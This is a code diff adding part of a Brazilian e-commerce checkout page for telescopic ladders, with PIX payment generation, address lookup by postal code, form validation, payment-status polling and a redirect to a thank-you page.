+          <p class="s" id="pix-addr1">-</p>
+          <p class="s" id="pix-addr2">-</p>
+        </div>
+      </div>
+    </section>
+  </div>
+
+  <!-- ============ ETAPA 3: CONFIRMAÇÃO ============ -->
+  <div id="view-ok" class="container hide">
+    <div class="okwrap">
+      <div class="okcard">
+        <div style="width:96px;height:96px;margin:0 auto 22px">
+          <svg viewBox="0 0 52 52" style="width:100%;height:100%">
+            <circle class="ck-circle" cx="26" cy="26" r="25"></circle>
+            <path class="ck-check" d="M14.1 27.2l7.1 7.2 16.7-16.8"></path>
+          </svg>
+        </div>
+        <h1>Pagamento confirmado!</h1>
+        <p class="p">Seu pagamento de <b id="ok-total">R$ 69,99</b> foi confirmado com sucesso.<br />Você receberá a confirmação e o código de rastreio no e-mail informado na compra.</p>
+        <div class="foot">
+          <div>Pedido <b id="ok-order">-</b></div>
+          <a href="/">Voltar à loja</a>
+        </div>
+      </div>
+    </div>
+  </div>
+</main>
+
+<!-- barra fixa (só na etapa de dados) -->
+<div class="bar" id="bar">
+  <div class="container">
+    <div class="top">
+      <div>
+        <div class="lbl">Total a pagar</div>
+        <div class="it" id="bar-items">1 item</div>
+      </div>
+      <div class="vl" id="bar-total">R$ 69,99</div>
+    </div>
+    <button type="button" class="btn" id="btn-pay">
+      <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M20 13c0 5-3.5 7.5-7.66 8.95a1 1 0 0 1-.67-.01C7.5 20.5 4 18 4 13V6a1 1 0 0 1 1-1c2 0 4.5-1.2 6.24-2.72a1.17 1.17 0 0 1 1.52 0C14.51 3.81 17 5 19 5a1 1 0 0 1 1 1z"/></svg>
+      <span id="btn-pay-lbl">Finalizar pedido</span>
+    </button>
+    <div class="trust">
+      <span><svg xmlns="http://www.w3.org/2000/svg" width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect width="18" height="11" x="3" y="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>Pagamento seguro</span>
+      <span><svg xmlns="http://www.w3.org/2000/svg" width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M20 13c0 5-3.5 7.5-7.66 8.95a1 1 0 0 1-.67-.01C7.5 20.5 4 18 4 13V6a1 1 0 0 1 1-1c2 0 4.5-1.2 6.24-2.72a1.17 1.17 0 0 1 1.52 0C14.51 3.81 17 5 19 5a1 1 0 0 1 1 1z"/></svg>Dados criptografados</span>
+    </div>
+  </div>
+</div>
+
+<div class="toast" id="toast"></div>
+
+<script>
+(function () {
+  'use strict';
+
+  /* ---------------------------------------------------------- catálogo */
+  var PRODUCTS = {
+    '5m': { id: '5m', name: 'Escada Telescópica - 5 Metros', label: '5 Metros', price: 69.99 },
+    '7m': { id: '7m', name: 'Escada Telescópica - 7 Metros', label: '7 Metros', price: 89.99 },
+    '9m': { id: '9m', name: 'Escada Telescópica - 9 Metros', label: '9 Metros', price: 109.99 }
+  };
+  var DEFAULT_SIZE = '5m';
+
+  var UF = [['AC','Acre'],['AL','Alagoas'],['AP','Amapá'],['AM','Amazonas'],['BA','Bahia'],['CE','Ceará'],['DF','Distrito Federal'],['ES','Espírito Santo'],['GO','Goiás'],['MA','Maranhão'],['MT','Mato Grosso'],['MS','Mato Grosso do Sul'],['MG','Minas Gerais'],['PA','Pará'],['PB','Paraíba'],['PR','Paraná'],['PE','Pernambuco'],['PI','Piauí'],['RJ','Rio de Janeiro'],['RN','Rio Grande do Norte'],['RS','Rio Grande do Sul'],['RO','Rondônia'],['RR','Roraima'],['SC','Santa Catarina'],['SP','São Paulo'],['SE','Sergipe'],['TO','Tocantins']];
+
+  var CUSTOMER_KEY = 'reformamax_checkout_customer';
+
+  /* ---------------------------------------------------------- previsão de entrega
+     Porte 1:1 do sistema de datas do checkout de referência:
+     conta apenas dias úteis (pula sábado e domingo) a partir de hoje. */
+  var PRAZO_MIN = 5;   // primeiro dia útil da faixa
+  var PRAZO_MAX = 9;   // último dia útil da faixa
+
+  function diasUteis(n) {
+    var d = new Date();
+    d.setHours(12, 0, 0, 0);
+    var c = 0;
+    while (c < n) {
+      d.setDate(d.getDate() + 1);
+      var w = d.getDay();
+      if (w !== 0 && w !== 6) c++;
+    }
+    return d;
+  }
+
+  function faixaEntrega(a, b) {
+    var M = ['janeiro', 'fevereiro', 'março', 'abril', 'maio', 'junho',
+             'julho', 'agosto', 'setembro', 'outubro', 'novembro', 'dezembro'];
+    var x = diasUteis(a), y = diasUteis(b);
+    return x.getMonth() === y.getMonth()
+      ? 'Entre os dias ' + x.getDate() + ' e ' + y.getDate() + ' de ' + M[x.getMonth()]
+      : 'Entre ' + x.getDate() + ' de ' + M[x.getMonth()] + ' e ' + y.getDate() + ' de ' + M[y.getMonth()];
+  }
+
+  function dataEntregaLonga() {
+    return diasUteis(PRAZO_MAX).toLocaleDateString('pt-BR', {
+      weekday: 'long', day: 'numeric', month: 'long'
+    });
+  }
+
+  function renderEntrega() {
+    var faixa = faixaEntrega(PRAZO_MIN, PRAZO_MAX).toLowerCase();
+    $('ship-eta').textContent = 'Chegará ' + faixa;
+    $('sum-eta').textContent = 'Via PIX · Chegará ' + faixa;
+    $('pix-eta').textContent = dataEntregaLonga();
+  }
+
+  /* ---------------------------------------------------------- estado */
+  var params = new URLSearchParams(window.location.search);
+  var sizeParam = (params.get('size') || params.get('sku') || params.get('variant') || '').toLowerCase().trim();
+  var product = PRODUCTS[sizeParam] || PRODUCTS[DEFAULT_SIZE];
+  var qty = 1;
+  var pix = null;          // { qrCode, copyPaste, orderId }
+  var generating = false;
+  var generated = false;
+  var pollTimer = null;
+  var tickTimer = null;
+  var secondsLeft = 600;
+
+  /* ---------------------------------------------------------- helpers */
+  var $ = function (id) { return document.getElementById(id); };
+  var digits = function (v) { return String(v == null ? '' : v).replace(/\D/g, ''); };
+  var brl = function (n) { return n.toLocaleString('pt-BR', { style: 'currency', currency: 'BRL', minimumFractionDigits: 2 }); };
+  var round2 = function (n) { return Math.round(n * 100) / 100; };
+
+  var toastTimer = null;
+  function toast(msg, bad) {
+    var el = $('toast');
+    el.textContent = msg;
+    el.className = 'toast show' + (bad ? ' bad' : '');
+    clearTimeout(toastTimer);
+    toastTimer = setTimeout(function () { el.className = 'toast' + (bad ? ' bad' : ''); }, 3200);
+  }
+
+  function utm() {
+    try { return (window.__rmUtmParams && window.__rmUtmParams()) || {}; } catch (e) { return {}; }
+  }
+  function utmQS() {
+    try { return (window.__rmUtmQS && window.__rmUtmQS()) || ''; } catch (e) { return ''; }
+  }
+  function homeUrl() {
+    try { return (window.__rmWithUtm && window.__rmWithUtm('/')) || '/'; } catch (e) { return '/'; }
+  }
+
+  /* ---------------------------------------------------------- render */
+  function total() { return round2(product.price * qty); }
+
+  function renderProduct() {
+    $('p-name').textContent = product.name;
+    $('p-tag').textContent = 'Tamanho: ' + product.label;
+    $('p-price').textContent = brl(product.price);
+    $('q-val').textContent = String(qty);
+    $('q-minus').disabled = qty <= 1;
+    $('q-plus').disabled = qty >= 10;
+
+    var t = total();
+    $('s-subtotal').textContent = brl(t);
+    $('s-total').textContent = brl(t);
+    $('bar-total').textContent = brl(t);
+    $('bar-items').textContent = qty + (qty === 1 ? ' item' : ' itens');
+  }
+
+  function fillStates() {
+    var sel = $('f-state');
+    for (var i = 0; i < UF.length; i++) {
+      var o = document.createElement('option');
+      o.value = UF[i][0];
+      o.textContent = UF[i][1];
+      sel.appendChild(o);
+    }
+  }
+
+  /* ---------------------------------------------------------- máscaras */
+  function maskPhone(e) {
+    var v = digits(e.target.value).slice(0, 11);
+    if (v.length > 6) v = v.replace(/(\d{2})(\d{5})(\d{1,4})/, '($1) $2-$3');
+    else if (v.length > 2) v = v.replace(/(\d{2})(\d{1,5})/, '($1) $2');
+    else if (v.length > 0) v = v.replace(/(\d{1,2})/, '($1');
+    e.target.value = v;
+  }
+  function maskCep(e) {
+    var v = digits(e.target.value).slice(0, 8);
+    if (v.length > 5) v = v.replace(/(\d{5})(\d{1,3})/, '$1-$2');
+    e.target.value = v;
+  }
+
+  /* ---------------------------------------------------------- CEP */
+  var lastCep = '';
+  function lookupCep() {
+    var cep = digits($('f-cep').value);
+    if (cep.length !== 8 || cep === lastCep) return;
+    lastCep = cep;
+    $('cepwrap').classList.add('loading');
+    fetch('https://viacep.com.br/ws/' + cep + '/json/')
+      .then(function (r) { return r.json(); })
+      .then(function (d) {
+        if (d && !d.erro) {
+          if (d.logradouro) $('f-address').value = d.logradouro;
+          if (d.bairro) $('f-neighborhood').value = d.bairro;
+          if (d.localidade) $('f-city').value = d.localidade;
+          if (d.uf) $('f-state').value = d.uf;
+          clearErrors();
+        } else {
+          toast('CEP não encontrado. Preencha o endereço manualmente.', true);
+        }
+      })
+      .catch(function () { toast('Não foi possível consultar o CEP. Preencha manualmente.', true); })
+      .finally(function () { $('cepwrap').classList.remove('loading'); });
+  }
+
+  /* ---------------------------------------------------------- validação */
+  var FIELDS = ['name', 'email', 'phone', 'cep', 'city', 'state', 'address', 'number', 'neighborhood'];
+
+  function clearErrors() {
+    for (var i = 0; i < FIELDS.length; i++) {
+      var e = $('e-' + FIELDS[i]);
+      var f = $('f-' + FIELDS[i]);
+      if (e) e.classList.remove('show');
+      if (f) f.classList.remove('inv');
+    }
+  }
+  function fail(field, msg) {
+    var e = $('e-' + field), f = $('f-' + field);
+    if (e) { if (msg) e.textContent = msg; e.classList.add('show'); }
+    if (f) f.classList.add('inv');
+    return false;
+  }
+
+  function readForm() {
+    return {
+      name: $('f-name').value.trim(),
+      email: $('f-email').value.trim(),
+      phone: $('f-phone').value.trim(),
+      cep: $('f-cep').value.trim(),
+      city: $('f-city').value.trim(),
+      state: $('f-state').value,
+      address: $('f-address').value.trim(),
+      number: $('f-sn').checked ? 'S/N' : $('f-number').value.trim(),
+      neighborhood: $('f-neighborhood').value.trim(),
+      complement: $('f-complement').value.trim()
+    };
+  }
+
+  function validate(d) {
+    clearErrors();
+    var first = null;
+    function bad(field, msg) { if (!first) first = field; fail(field, msg); }
+
+    if (d.name.length < 3 || d.name.indexOf(' ') === -1) bad('name');
+    if (!/^[^\s@]+@[^\s@]+\.[^\s@]{2,}$/.test(d.email)) bad('email');
+    var ph = digits(d.phone);
+    if (ph.length < 10 || ph.length > 11) bad('phone');
+    if (digits(d.cep).length !== 8) bad('cep');
+    if (!d.city) bad('city');
+    if (!d.state) bad('state');
+    if (!d.address) bad('address');
+    if (!d.number) bad('number');
+    if (!d.neighborhood) bad('neighborhood');
+
+    if (first) {
+      var el = $('f-' + first);
+      if (el && el.scrollIntoView) el.scrollIntoView({ behavior: 'smooth', block: 'center' });
+      toast('Confira os campos destacados para continuar.', true);
+      return false;
+    }
+    return true;
+  }
+
+  /* ---------------------------------------------------------- persistência leve */
+  function saveCustomer(d) {
+    try {
+      sessionStorage.setItem(CUSTOMER_KEY, JSON.stringify({
+        name: d.name, email: d.email, phone: d.phone, cep: d.cep,
+        city: d.city, state: d.state, address: d.address, number: d.number,
+        neighborhood: d.neighborhood, complement: d.complement
+      }));
+    } catch (e) {}
+  }
+  function restoreCustomer() {
+    var d;
+    try { d = JSON.parse(sessionStorage.getItem(CUSTOMER_KEY) || 'null'); } catch (e) { d = null; }
+    if (!d) return;
+    ['name','email','phone','cep','city','address','neighborhood','complement'].forEach(function (k) {
+      if (d[k] && $('f-' + k)) $('f-' + k).value = d[k];
+    });
+    if (d.state) $('f-state').value = d.state;
+    if (d.number === 'S/N') { $('f-sn').checked = true; $('f-number').disabled = true; }
+    else if (d.number) $('f-number').value = d.number;
+    if (d.cep) lastCep = digits(d.cep);
+  }
+
+  /* ---------------------------------------------------------- botão pagar */
+  var PAY_ICON = '<svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M20 13c0 5-3.5 7.5-7.66 8.95a1 1 0 0 1-.67-.01C7.5 20.5 4 18 4 13V6a1 1 0 0 1 1-1c2 0 4.5-1.2 6.24-2.72a1.17 1.17 0 0 1 1.52 0C14.51 3.81 17 5 19 5a1 1 0 0 1 1 1z"/></svg>';
+  var DONE_ICON = '<svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M20 6 9 17l-5-5"/></svg>';
+
+  function setPayState(state) {
+    var btn = $('btn-pay');
+    btn.classList.remove('is-loading', 'is-done', 'is-disabled');
+    if (state === 'loading') {
+      btn.disabled = true;
+      btn.classList.add('is-loading');
+      btn.innerHTML = '<span class="spin w"></span><span id="btn-pay-lbl">Gerando PIX...</span>';
+    } else if (state === 'done') {
+      btn.disabled = true;
+      btn.classList.add('is-done');
+      btn.innerHTML = DONE_ICON + '<span id="btn-pay-lbl">PIX gerado</span>';
+    } else {
+      btn.disabled = false;
+      btn.innerHTML = PAY_ICON + '<span id="btn-pay-lbl">Finalizar pedido</span>';
+    }
+  }
+
+  /* ---------------------------------------------------------- criar PIX */
+  function createPix() {
+    if (generating || generated) return;
+    var d = readForm();
+    if (!validate(d)) return;
+    saveCustomer(d);
+
+    generating = true;
+    setPayState('loading');
+
+    var amount = total();
+    var payload = {
+      amount: amount,
+      customer: {
+        name: d.name,
+        email: d.email,
+        phone: digits(d.phone)
+      },
+      items: [{
+        id: product.id,
+        name: product.name,
+        quantity: qty,
+        price: product.price
+      }],
+      shippingAddress: {
+        cep: digits(d.cep),
+        city: d.city,
+        state: d.state,
+        address: d.address,
+        number: d.number,
+        neighborhood: d.neighborhood,
+        complement: d.complement
+      },
+      utm: utm()
+    };
+
+    fetch('/checkout-create-pix.php', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify(payload)
+    })
+      .then(function (r) { return r.json().catch(function () { return null; }); })
+      .then(function (res) {
+        if (!res || !res.success) {
+          throw new Error((res && res.error) || 'Erro ao gerar PIX. Tente novamente.');
+        }
+        generated = true;
+        pix = {
+          qrCode: res.qrCode || '',
+          copyPaste: res.copyPaste || '',
+          orderId: res.orderId || res.externalId || ''
+        };
+        showPix(d);
+      })
+      .catch(function (err) {
+        generating = false;
+        setPayState('idle');
+        toast(err && err.message ? err.message : 'Erro ao gerar PIX. Tente novamente.', true);
+      });
+  }
+
+  /* ---------------------------------------------------------- tela PIX */
+  function showPix(d) {
+    setPayState('done');
+    $('bar').classList.add('hide');
+    $('view-form').classList.add('hide');
+    $('view-pix').classList.remove('hide');
+    window.scrollTo(0, 0);
+
+    // QR Code
+    var box = $('qrbox');
+    var src = pix.qrCode;
+    if (!src && pix.copyPaste) {
+      src = 'https://api.qrserver.com/v1/create-qr-code/?size=300x300&data=' + encodeURIComponent(pix.copyPaste);
+    }
+    if (src) {
+      box.innerHTML = '';
+      var img = document.createElement('img');
+      img.alt = 'QR Code PIX';
+      img.src = src;
+      box.appendChild(img);
+    } else {
+      box.innerHTML = '<span style="font-size:12px;color:var(--muted-foreground);text-align:center">QR Code indisponível - use o código Copia e Cola</span>';
+    }
+
+    // Copia e cola
+    $('pix-code').textContent = pix.copyPaste || 'Código PIX não disponível';
+    $('btn-copy').disabled = !pix.copyPaste;
+
+    // Resumo
+    var t = total();
+    $('pix-name').textContent = product.name;
+    $('pix-qty').textContent = 'Tamanho: ' + product.label + ' · Qtd: ' + qty;
+    $('pix-line').textContent = brl(t);
+    $('pix-subtotal').textContent = brl(t);
+    $('pix-total').textContent = brl(t);
+    $('ok-total').textContent = brl(t);
+
+    // Entrega
+    $('pix-cust').textContent = d.name;
+    $('pix-addr1').textContent = d.address + ', ' + d.number + (d.complement ? ' - ' + d.complement : '');
+    $('pix-addr2').textContent = d.neighborhood + ' · ' + d.city + '/' + d.state + ' · CEP ' + d.cep;
+
+    startTimer();
+    startPolling();
+    toast('PIX gerado com sucesso!');
+  }
+
+  function startTimer() {
+    clearInterval(tickTimer);
+    tickTimer = setInterval(function () {
+      secondsLeft = secondsLeft <= 1 ? 0 : secondsLeft - 1;
+      var m = Math.floor(secondsLeft / 60), s = secondsLeft % 60;
+      $('pix-timer').textContent = ('0' + m).slice(-2) + ':' + ('0' + s).slice(-2);
+      if (secondsLeft === 0) clearInterval(tickTimer);
+    }, 1000);
+  }
+
+  /* ---------------------------------------------------------- polling status */
+  function startPolling() {
+    if (!pix || !pix.orderId) return;
+    clearInterval(pollTimer);
+    checkStatus();
+    pollTimer = setInterval(checkStatus, 5000);
+  }
+
+  function checkStatus() {
+    if (!pix || !pix.orderId) return;
+    var url = '/orders_status.php?select=status&id=eq.' + encodeURIComponent(pix.orderId) + utmQS();
+    fetch(url, { cache: 'no-store' })
+      .then(function (r) { return r.json(); })
+      .then(function (rows) {
+        var row = Array.isArray(rows) && rows.length ? rows[0] : null;
+        if (!row) return;
+        if (row.status === 'paid') {
+          clearInterval(pollTimer);
+          clearInterval(tickTimer);
+          var st = $('pix-status');
+          st.className = 'status paid';
+          st.innerHTML = '<svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M20 6 9 17l-5-5"/></svg><span>Pagamento confirmado!</span>';
+          setTimeout(showSuccess, 900);
+        } else if (row.status === 'cancelled') {
+          clearInterval(pollTimer);
+          var s2 = $('pix-status');
+          s2.className = 'status cancel';
+          s2.innerHTML = '<span>Pagamento cancelado ou expirado. Gere um novo PIX.</span>';
+        }
+      })
+      .catch(function () { /* silencioso: tenta de novo no próximo ciclo */ });
+  }
+
+  var THANKYOU_URL = 'https://reformamax.rastreio-express.online/obrigado';
+
+  function showSuccess() {
+    try { sessionStorage.removeItem(CUSTOMER_KEY); } catch (e) {}
+    var ov = $('vsc-overlay');
+    if (!ov) { window.location.href = THANKYOU_URL; return; }
+    ov.classList.add('show');
+    window.scrollTo(0, 0);
+    var el = $('vsc-count');
+    setTimeout(function () { if (el) el.textContent = '2'; }, 1000);
+    setTimeout(function () { if (el) el.textContent = '1'; }, 2000);
+    setTimeout(function () { window.location.href = THANKYOU_URL; }, 3000);
+  }
+
+  /* ---------------------------------------------------------- copiar */
+  function copyCode() {
+    if (!pix || !pix.copyPaste) return;
+    var done = function () {
+      $('btn-copy-lbl').textContent = 'Copiado';
+      $('btn-copy').classList.add('is-done');
+      toast('Código PIX copiado!');
+      setTimeout(function () {
+        $('btn-copy-lbl').textContent = 'Copiar';
+        $('btn-copy').classList.remove('is-done');
+      }, 3000);
+    };
+    if (navigator.clipboard && navigator.clipboard.writeText) {
+      navigator.clipboard.writeText(pix.copyPaste).then(done).catch(fallbackCopy);
+    } else {
+      fallbackCopy();
+    }
+    function fallbackCopy() {
+      try {
+        var ta = document.createElement('textarea');
+        ta.value = pix.copyPaste;
+        ta.setAttribute('readonly', '');
+        ta.style.position = 'fixed';
+        ta.style.opacity = '0';
+        document.body.appendChild(ta);
+        ta.select();
+        document.execCommand('copy');
+        document.body.removeChild(ta);
+        done();
+      } catch (e) {
+        toast('Não foi possível copiar. Selecione o código manualmente.', true);
+      }
+    }
+  }
+
+  /* ---------------------------------------------------------- eventos */
+  function bind() {
+    $('btn-back').addEventListener('click', function () { window.location.href = homeUrl(); });
+
+    $('q-minus').addEventListener('click', function () { if (qty > 1) { qty--; renderProduct(); } });
+    $('q-plus').addEventListener('click', function () { if (qty < 10) { qty++; renderProduct(); } });
+
+    $('f-phone').addEventListener('input', maskPhone);
+    $('f-cep').addEventListener('input', function (e) { maskCep(e); lookupCep(); });
+    $('f-cep').addEventListener('blur', lookupCep);
+
+    $('f-sn').addEventListener('change', function () {
+      var n = $('f-number');
+      n.disabled = this.checked;
+      if (this.checked) n.value = '';
+    });
+
+    $('btn-pay').addEventListener('click', createPix);
+    $('btn-copy').addEventListener('click', copyCode);
+
+    // limpa o destaque de erro ao corrigir
+    FIELDS.forEach(function (f) {
+      var el = $('f-' + f);
+      if (!el) return;
+      el.addEventListener('input', function () {
+        el.classList.remove('inv');
+        var e = $('e-' + f);
+        if (e) e.classList.remove('show');
+      });
+      el.addEventListener('change', function () {
+        el.classList.remove('inv');
+        var e = $('e-' + f);
+        if (e) e.classList.remove('show');
+      });
+    });
+
+    // evita sair sem querer com PIX gerado e não pago
+    window.addEventListener('beforeunload', function (ev) {
+      if (generated && $('view-ok').classList.contains('hide')) {
+        ev.preventDefault();
+        ev.returnValue = '';
+      }
+    });
+  }
+
+  /* --------------------------------------------- guarda de placeholder
+     Scripts externos (pixel/lead capture) podem escrever valor vazio nos
+     inputs - principalmente em [name="customer_name"] - e derrubar o
+     placeholder. Isso devolve o placeholder e limpa valor só com espaços. */
+  function placeholderGuard() {
+    var ids = ['f-name','f-email','f-phone','f-cep','f-city','f-address','f-number','f-neighborhood','f-complement'];
+    var ph = {};
+    ids.forEach(function (id) { var el = $(id); if (el) ph[id] = el.getAttribute('placeholder') || ''; });
+    function fix() {
+      ids.forEach(function (id) {
+        var el = $(id); if (!el) return;
+        if (el.value && !el.value.trim()) el.value = '';
+        if (ph[id] && el.getAttribute('placeholder') !== ph[id]) el.setAttribute('placeholder', ph[id]);
+      });
+    }
+    fix();
+    var n = 0, t = setInterval(function () { fix(); if (++n > 24) clearInterval(t); }, 250);
+    window.addEventListener('load', fix);
+  }
+
+  /* ---------------------------------------------------------- init */
+  fillStates();
+  restoreCustomer();
+  renderProduct();
+  renderEntrega();
+  bind();
+  placeholderGuard();
+})();
+</script>
+
+<div id="vsc-overlay">
+  <div class="vsc-card">
+    <div style="width:100px;height:100px;margin:0 auto 24px">
+      <svg viewBox="0 0 52 52" style="width:100%;height:100%">
+        <circle class="vsc-circle" cx="26" cy="26" r="25"></circle>
+        <path class="vsc-check" d="M14.1 27.2l7.1 7.2 16.7-16.8"></path>
+      </svg>
+    </div>
+    <h1 class="vsc-title">Pagamento Confirmado!</h1>
+    <div class="vsc-foot">
+      <p class="vsc-lbl">Voc&ecirc; ser&aacute; redirecionado automaticamente em:</p>
+      <div class="vsc-count" id="vsc-count">3</div>
+      <p class="vsc-fb">Se o redirecionamento n&atilde;o funcionar, <a href="https://reformamax.rastreio-express.online/obrigado">clique aqui</a></p>
+    </div>
+  </div>
+</div>
+</body>
+</html>
